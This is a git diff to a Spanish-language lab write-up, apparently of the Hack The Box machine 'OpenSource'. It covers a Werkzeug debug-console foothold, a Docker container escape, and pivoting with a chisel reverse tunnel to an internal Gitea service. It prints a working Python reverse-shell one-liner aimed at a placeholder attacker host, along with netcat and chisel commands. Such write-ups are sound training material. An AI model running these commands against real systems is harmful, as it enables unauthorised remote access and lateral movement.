@@ -75,11 +75,24 @@ Siguiendo los pasos indicados en https://github.com/wdahlenburg/werkzeug-debug-c
 
 Como se puede visualizar en la imagen, se ejecutan los comandos en la consola python y se obtiene el código de salida de python de cada comando. El siguiente paso es ejecutar una reverse shell en python, para ello pondre un puerto a la escucha con el comando `nc -lvp <puerto>` y utilizaré el comando `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI-IP",KALI-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
 
-Se obtiene así la primera shell, al listar el contenido de la raíz se observa un archivo ".dockerenv"  por lo que se sabe que estamos dentro de un contenedor Docker, lo cual encaja con el hecho de que la shell obtenida sea como usuario root.
+Se obtiene así la primera shell. Al listar el contenido de la raíz se observa un archivo ".dockerenv"  por lo que se sabe que estamos dentro de un contenedor Docker, lo cual encaja con el hecho de que la shell obtenida sea como usuario root.
 
 Para continuar con el pivoting, tras una larga búsqueda se comprueba que el puerto 3000 inicialmente inaccesible, se encuentra ahora accesible en la ip 172.17.0.1 correspondiente con el host del contenedor docker. 
  ![image](https://user-images.githubusercontent.com/97627828/174666337-481ff02d-d80e-4480-86ca-3f5a4fab8cb1.png)
  ![image](https://user-images.githubusercontent.com/97627828/174666547-fd032f01-cd7a-4442-a582-2433c1ba8052.png)
+
+Para poder visualizar el contenido del servidor web desde el navegador de mi máquina, se reallizará un tunel con chisel. Para ello se deberán llevar a cabo los siguientes pasos:
+ - Descargar chisel en mi máquina y compilarlo (imprtante comprobar la versión, si se producen errores cambiar la versión descargada de chisel).
+ - Trasladar el binario a opensource.htb utilizando `wget`.
+ - Ejecutar en mi máquina `./chisel server -p 8888 --reverse`
+ - Ejecutar en el docker `./chisel client kali-ip:8888 R:8000:172.17.0.1:3000`
+ - Abrir en  mi navegador `http://localhost:8000`
+ - ![image](https://user-images.githubusercontent.com/97627828/174667867-9e9a983e-10dd-48fa-bc41-d46f97434a2a.png)
+Se visualiza el contenido a travéz del navegador:
+
+![image](https://user-images.githubusercontent.com/97627828/174667969-0f833332-3061-4f06-a7c3-82c68d46ee4c.png)
+
+Dado  que encontramos Gitea, es momento de volver al archivo "source.zip" descargado anteriormente con la carpeta ".git"
 
 
 
